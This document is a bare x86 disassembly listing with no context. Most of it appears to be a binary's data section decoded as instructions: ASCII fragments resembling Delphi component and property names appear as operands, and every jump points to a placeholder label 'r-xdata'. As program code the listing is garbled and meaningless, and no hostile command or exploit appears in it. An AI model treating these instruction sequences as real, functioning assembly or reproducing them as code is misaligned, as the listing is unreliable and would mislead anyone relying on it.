push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al ah
lodsb [ esi ]
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ edi ] al
inc esp
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x53c3ffc0 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebp + 0xc080044 ]
push esp
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sbb al 0xaf
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
xor [ esp + eax * 2 ] dh
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
shl [ esp + eax * 2 + 0x44ae9000 ] 0x0
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44b0a4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] al
add [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] cl
mov esp 0x10000044
inc eax
add [ esi + ebp * 4 + 0x44 ] al
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44b01cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4e ] ah
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
movsb [ edi ] [ esi ]
mov al 0x44
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
or [ ebp ] al
cwde
jmp r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
push esp
jmp 0x834b232
add [ eax ] al
pop eax
jo r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] dl
out dx al
inc esp
add [ ebp + edi * 8 + 0x44 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ eax + 0x4800450c ] al
xor al [ eax ]
xor al [ fs : eax ]
sub al 0xea
jo r-xdata
add [ eax + 0x70 ] bl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov [ edi + 0x17080044 ] gs
lea eax [ eax ]
mov esp 0x44b1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] cl
inc esp
add [ esp + esi * 4 ] dh
inc esp
add [ eax ] al
jbe r-xdata
add [ esi ] ah
mov ah 0x44
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x41 ] dh
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] bl
mov cl 0x44
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
add [ eax + 0x19 ] ah
inc ebp
add [ eax + 0xd ] bl
inc ebp
add [ edi + ecx * 4 + 0x19280041 ] ch
inc ebp
add [ ebp * 8 - 0x136fffbc ] ah
inc esp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
add [ edx + ebp * 8 ] ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44a372
inc esp
add al bl
int 0x44
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + 0x500044ce ] ah
into
inc esp
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc esp
add [ eax ] bl
iretd
inc ebx
outsd
outsb
je r-xdata
int 0x44
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + 0x500044ce ] ah
into
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
mov [ 0x44 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esp + eax * 2 + 0x4000 ] ah
add [ ebx ] cl
inc esp
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ edi + ecx * 8 + 0x44 ] ah
inc esp
add [ ecx + edx * 8 + 0x44 ] al
add [ eax - 0x43ffbb33 ] bh
int3
inc ebx
outsd
outsb
je r-xdata
int 0x44
add al bl
int 0x44
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0xf ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc esp
add al ah
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5c ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5c ] si
inc esp
add al bl
mov [ 0x44 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
into
inc esp
add [ eax ] al
iretd
inc esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700044a4 ] dh
add [ eax ] al
add [ eax - 0x5e ] cl
inc esp
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ eax ] dh
into
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0x11 ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ edi + ecx * 4 + 0x57a40041 ] ch
inc edx
add [ eax + 0x54004257 ] dl
jecxz r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax - 0x32 ] al
inc esp
add [ eax - 0x2f ] bl
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add [ ebx + 0x44a538c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x44 ] dh
add [ eax ] dh
add [ eax ] al
sub [ esp + eax * 2 + 0x4034e000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add [ eax + eax ] bl
add [ eax ] al
aam 0xb7
inc ebp
add al ah
xor al 0x40
add ah ch
xor al 0x40
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] al
or [ ebx + 0x6f ] al
add [ eax - 0x67ffbe70 ] dl
nop
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44a70890
add [ ebx ] al
or al 0x54
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
cwde
in eax 0x44
add [ eax ] al
sbb al 0x42
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
out 0x44 eax
add ah ah
mov esi 0xbef80045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc4a712
inc ebp
add [ ecx + ebp * 8 ] dl
inc esp
add ah dh
call 0xffffffffe978a71e
inc esp
add [ eax ] ah
call 0xffffffffbfd8a726
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f8a732
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
insb
jae r-xdata
add ah cl
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
jae r-xdata
add [ ebp - 0x598bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x6b610874
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] ah
add [ ecx + esi ] bl
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ esi + 0xe070044 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x4fffbe71 ] al
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb0044a7 ] al
jae r-xdata
add al 0xa8
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] al
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax + 0x340044e7 ] bh
sbb al 0x42
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
add [ esp + ebx + 0x42 ] ch
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec ebp
popad
hlt
outsd
insb
jae r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rol [ edi + 0xa030044 ] 0x54
outsb
add [ fs : eax ] eax
add [ eax ] al
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
int3
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc eax
add [ eax + ebp * 4 + 0x8060044 ] cl
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
push edi
inc edx
add [ ebx + 0x44 ] dl
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + 0x4004231 ] cl
add [ eax ] cl
inc ebx
outsd
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
test al 0x44
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
pushfd
add [ eax + eax ] dl
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44a89c74
jb r-xdata
in al 0x44
add [ eax - 0x58 ] eax
jb r-xdata
jb r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
popad
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x44aa68c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
imul esp [ edi + 0x68 ] 0x44a89c74
imul esp [ gs : edi + 0x68 ] 0x44a89c74
add [ eax + eax ] cl
add bh bh
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
test al 0x44
add [ eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44a90873
add [ eax + 0x62 ] al
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc eax
test al 0x44
imul ebp [ edi + 0x6e ] 0xa82cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
shl [ edi + 0x9030044 ] 0x1
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
outsd
insb
jae r-xdata
clc
in al 0x44
inc ebx
outsd
outsb
jae r-xdata
add [ eax - 0x53ffbe70 ] bl
pop [ ecx ]
test ch ah
inc esp
add [ esp + 0x44 ] dh
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc esp
add [ ebx ] al
add [ eax ] al
add [ eax - 0x58 ] al
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc esp
add [ eax + 0x74614454 ] al
add [ gs : eax ] edi
test al 0x44
outsb
mov eax eax
sub al 0xa8
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x6d695454 ] al
add [ gs : eax + ebp * 4 + 0x44 ] eax
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ edx + ebx * 2 + 0x18900041 ] dh
stosd [ edi ]
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax + ebp * 4 + 0x80044 ] bl
add bh bh
popad
js r-xdata
jb r-xdata
dec esp
popad
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add al 0x5
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x44a84401
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esp
dec ebx
jns r-xdata
push 0xb4004010
pop edx
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
xor al 0xa9
inc esp
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edi + 0x44 ] al
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al dl
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
